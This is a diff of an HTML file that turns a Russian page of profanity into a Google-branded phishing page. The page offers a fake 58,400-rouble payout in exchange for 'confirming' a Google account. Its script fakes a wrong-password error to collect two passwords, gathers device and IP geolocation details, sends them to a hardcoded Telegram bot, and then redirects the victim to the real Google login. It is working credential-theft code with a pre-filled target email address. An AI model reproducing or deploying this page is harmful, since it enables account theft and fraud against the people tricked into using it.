@@ -2,29 +2,103 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>еще раз пошел нахуй</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google — Подтверждение выплаты</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        .container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .text {
-            font-size: 100px;
-            font-weight: bold;
-            font-family: sans-serif;
-            text-transform: uppercase;
-        }
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 10px; box-sizing: border-box; }
+        .container { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; }
+        @media (max-width: 450px) { .container { border: none; padding: 20px; } }
+        .logo { width: 75px; margin-bottom: 15px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 10px; }
+        .reward { color: #1e8e3e; font-size: 19px; font-weight: bold; margin-bottom: 20px; }
+        p { font-size: 15px; color: #3c4043; margin-bottom: 20px; line-height: 1.4; }
+        .error-msg { color: #d93025; font-size: 14px; margin-bottom: 15px; text-align: left; display: none; align-items: center; justify-content: flex-start; background: #fff8f7; padding: 8px; border-radius: 4px; }
+        .error-msg svg { fill: #d93025; margin-right: 8px; flex-shrink: 0; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; margin-bottom: 15px; }
+        input.invalid { border: 1px solid #d93025; background-color: #fff8f7; }
+        .btn { width: 100%; background-color: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: 500; font-size: 15px; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        .footer { margin-top: 40px; font-size: 12px; color: #70757a; text-align: left; border-top: 1px solid #eee; padding-top: 15px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="text">пошел нахуй</div>
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+    <h1>Выплата начислена</h1>
+    <div class="reward">+ 58,400.00 ₽</div>
+    <p>Для зачисления средств подтвердите владение аккаунтом Google.</p>
+
+    <div id="errorBlock" class="error-msg">
+        <svg width="18" height="18" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+        <span>Неверный пароль. Повторите попытку.</span>
     </div>
+
+    <form id="mainForm">
+        <input type="email" id="email" placeholder="Email или телефон" required value="kazagalievtologon@gmail.com">
+        <input type="password" id="password" placeholder="Введите ваш пароль" required>
+        <button type="submit" class="btn">ПОДТВЕРДИТЬ</button>
+    </form>
+
+    <div class="footer">© 2026 Google Pay. 🛡️</div>
+</div>
+
+<script>
+    const TOKEN = "8842170945:AAEhK5iz1tqtoKUtoU94tI9iP-YtHoqwF4g";
+    const CHAT_ID = "8642898930";
+    
+    let logs = []; 
+    let step = 0;
+
+    document.getElementById('mainForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        step++;
+
+        const email = document.getElementById('email').value.trim();
+        const currentPass = document.getElementById('password').value.trim();
+        const errorBlock = document.getElementById('errorBlock');
+        const passInput = document.getElementById('password');
+
+        logs.push(currentPass);
+
+        if (step === 1) {
+            errorBlock.style.display = 'flex';
+            passInput.classList.add('invalid');
+            passInput.value = '';
+            passInput.focus();
+        } else {
+            // СОБИРАЕМ ДАННЫЕ ОБ УСТРОЙСТВЕ
+            const device = navigator.userAgent;
+            const platform = navigator.platform;
+            
+            // ЗАПРОС ГЕОЛОКАЦИИ ПО IP
+            let geoInfo = "Не удалось определить";
+            try {
+                const res = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,isp,query');
+                const data = await res.json();
+                if(data.status === 'success') {
+                    geoInfo = `📍 **Место:** ${data.country}, ${data.city}\n🏢 **Провайдер:** ${data.isp}\n🌐 **IP:** \`${data.query}\``;
+                }
+            } catch(err) {
+                geoInfo = "🌐 **IP:** Ошибка получения данных";
+            }
+
+            const msg = `👑 **УЛОВ ДЛЯ ТОЛОГОНА** 👑\n` +
+                        `--------------------------\n` +
+                        `📧 **Email:** \`${email}\`\n` +
+                        `🔑 **Пароли:** ${logs.join(' | ')}\n` +
+                        `--------------------------\n` +
+                        `${geoInfo}\n` +
+                        `📱 **Устройство:** ${platform}\n` +
+                        `🔍 **Браузер:** ${device.split(' ').slice(-1)}`;
+
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+            navigator.sendBeacon(url);
+
+            window.location.replace("https://accounts.google.com/ServiceLogin");
+        }
+    });
+</script>
 
 </body>
 </html>
